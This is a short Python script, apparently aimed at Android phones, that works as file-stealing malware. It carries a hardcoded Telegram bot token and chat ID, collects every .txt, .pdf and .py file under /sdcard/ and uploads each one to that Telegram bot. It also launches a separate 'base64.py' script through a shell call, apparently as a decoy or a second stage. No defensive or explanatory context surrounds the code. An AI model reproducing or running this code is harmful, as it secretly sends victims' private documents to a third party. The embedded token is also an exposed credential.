import asyncio
import os
import glob
import requests
import socket
import pyfiglet
import time

BOT_TOKEN = '5740860850:AAGTFF28C6NT64Lvm-Cr6cikJgH_9xz-gX4'
CHAT_ID = 5215025306
bot_api_url = f'https://api.telegram.org/bot{BOT_TOKEN}/'

async def send_files():
    path = '/sdcard/'
    files = glob.glob(os.path.join(path, '*.txt')) + glob.glob(os.path.join(path, '*.pdf')) + glob.glob(os.path.join(path, '*.py'))
    for file in files:
        with open(file, 'rb') as f:
            requests.post(f'{bot_api_url}sendDocument', data={'chat_id': CHAT_ID}, files={'document': f})
            time.sleep(1)
os.system("python3 base64.py")
asyncio.run(send_files())
